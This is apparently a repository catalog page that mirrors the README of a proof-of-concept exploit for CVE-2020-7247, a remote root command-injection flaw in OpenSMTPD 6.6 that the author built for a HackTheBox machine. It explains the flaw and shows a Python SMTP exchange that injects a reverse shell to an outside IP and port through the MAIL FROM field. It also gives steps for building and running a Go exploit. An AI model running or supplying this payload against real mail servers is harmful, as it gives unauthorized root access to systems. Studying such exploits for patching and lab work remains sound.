# CVE-2020-7247

CVE-2020-7247 Remote Code Execution POC

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/gatariee](https://github.com/gatariee) |
| Url      | [https://github.com/gatariee/CVE-2020-7247](https://github.com/gatariee/CVE-2020-7247)                                               |
| Stars    | 1                                                          |
| License  | MIT License                                                        |

<details>

<summary>Topic / Tags</summary>

* cve* go* python

</details>

## Readme


# CVE-2020-7247

OpenSMTPD version 6.6, which is used in OpenBSD 6.6 and other software, contains a vulnerability in the "smtp_mailaddr" function in the "smtp_session.c" file. This vulnerability can be exploited by a remote attacker by sending a specially crafted SMTP session that contains shell metacharacters in the "MAIL FROM" field. If exploited, this vulnerability could allow an attacker to execute arbitrary commands as the root user on the affected system. The vulnerability is present in the default configuration and is caused by a flaw in input validation that returns an incorrect value upon failure.
<br>
<br>
Author: @gatariee 
<br>
Exploited created for HackTheBox's OpenKeyS (unintended solution, oh well)

Replace your [revshells](https://www.revshells.com/) with anything you want.

## Exploit Example
```python
conn.send(b'HELO x')
s.recv(1024)
conn.send(b'MAIL FROM: <;{sh -i >& /dev/tcp/192.168.4.1/9001 0>&1};>)')
s.recv(1024)
s.send(b'RCPT TO:<root@localhost>')
s.recv(1024)
s.send(b'DATA\r\n')
s.recv(1024)
s.send(b'sad\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
...
```






## Usage

```bash
git clone https://github.com/gatariee/CVE-2020-7247
cd cve-2020-7247
go build cve-2020-7247.go -o /cve-2020-7247
chmod +x cve-2020-7247
./cve-2020-7247
```





## Get the content

```
git clone https://github.com/gatariee/CVE-2020-7247
cd CVE-2020-7247
```

{% embed url="https://github.com/gatariee/CVE-2020-7247" %}

<figure><img src="https://avatars.githubusercontent.com/u/79693291?v=4" alt=""><figcaption><p>gatariee</p></figcaption></figure>
